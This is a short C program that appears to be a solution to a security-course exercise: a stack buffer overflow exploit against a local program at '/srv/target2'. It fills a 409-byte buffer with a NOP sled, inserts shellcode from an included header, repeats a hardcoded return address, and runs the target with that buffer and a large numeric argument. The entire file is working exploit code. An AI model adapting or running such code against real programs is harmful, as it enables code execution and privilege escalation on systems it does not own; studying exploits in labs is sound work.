#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target2"

const int BSIZE = 409;
const int DIFF = 201;
const uint32_t ADD = 0xffffdb5c;

void prep(char *buf) {
    memset(buf, 0x90, BSIZE - 1);
    memcpy(buf + DIFF, shellcode, sizeof(shellcode) - 1);

    for (int i = DIFF + sizeof(shellcode) - 1; i < BSIZE - 1; i += 4) {
        *(uint32_t *)(buf + i) = ADD;
    }

    buf[BSIZE - 1] = '\0';
}

int main(void) {
    char buf[BSIZE];
    char *args[4] = {TARGET, buf, "65935", NULL};
    char *env[1] = {NULL};

    prep(buf);
    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}